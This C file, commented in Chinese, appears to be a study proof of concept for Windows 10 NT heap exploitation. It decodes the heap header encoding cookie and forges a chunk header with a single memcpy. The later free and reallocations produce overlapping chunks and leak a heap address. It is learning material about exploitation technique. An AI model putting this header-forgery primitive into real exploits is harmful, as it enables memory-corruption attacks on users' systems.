/*
tested on windows 10 x64 19042.630 Release

ntheap frontend overlap POC

大致原理:
    
注意:
    调试时, 直接运行程序, 和用windbg调试打开的程序的heap是不一样的.
    正确的调试方法是, 在cmd中运行, 然后attach上去查看
        这样可以清晰看到_heap 中的FrontEndHeap是默认打开的, 也就是可能会使用LFH
        此时malloc(0x100) -> 实际size为0x110
    假如在调试模式下FrontEndHeap是默认关闭
        并且比如malloc(0x100) -> 实际size为0x130
        而且_heap_entry->flag域也不一样
    LFH range: < 0x4000, 并且需要分配大小相同的size 大概18次左右, 才会启用LFH, 而且LFH貌似只是针对同一个size
		所以可以看出, poc这里并不是lfh
		
		btw, 我们可以用 !heap -x 查看heap, 如果后面的flag中有LFH的字样, 才是使用了LFH
要求:
    需要能越界写_heap_entry的头部
预期效果:
    获得overlap chunk, leak出heap

refer: https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version
       https://github.com/scwuaptx/LazyFragmentationHeap/
*/

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

LPVOID ptr[0x20];

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}
LPVOID Alloc(SIZE_T cb) {
    return calloc(1,cb);
}
void Free(void* ptr) {
    return free(ptr);
}
void log() {
    for (int i = 0; i < 0x20; i++) {
        if (ptr[i]) {
            printf("idx: %d --> %p\n", i, ptr[i]);
        }
    }
    putchar('\n');
}
int main()
{
    init();
    Alloc(0x228);  Alloc(0x228); // padding
    // 有了上面的padding, 下面的分配就连续了
    ptr[0] = Alloc(0x228); // real: 0x230
    ptr[1] = Alloc(0x500); // real: 0x510
    ptr[2] = Alloc(0x1000); // real: 0x1010
    log();
    SIZE_T leak = *(SIZE_T*)((intptr_t)ptr[1] - 8);
    SIZE_T cookie = (leak ^ 0x002350010051) & 0xffffffffffff; // _heap->Encoding
    SIZE_T fake_header = cookie ^ 0x002352010152; // 0x510+0x1010==0x001520
    
    //getchar(); //waiting for attach
    // trigger
    memcpy((void*)((intptr_t)ptr[1] - 8), &fake_header, 6);
    Free(ptr[1]); ptr[1] = 0;
    // padding
    ptr[1] = Alloc(0x500);
    printf("leak from ptr[2] @ %p\n", *(SIZE_T*)ptr[2]);
    // overlap with ptr[2]
    ptr[3] = Alloc(0x1000); 
    log();
    return 0;
}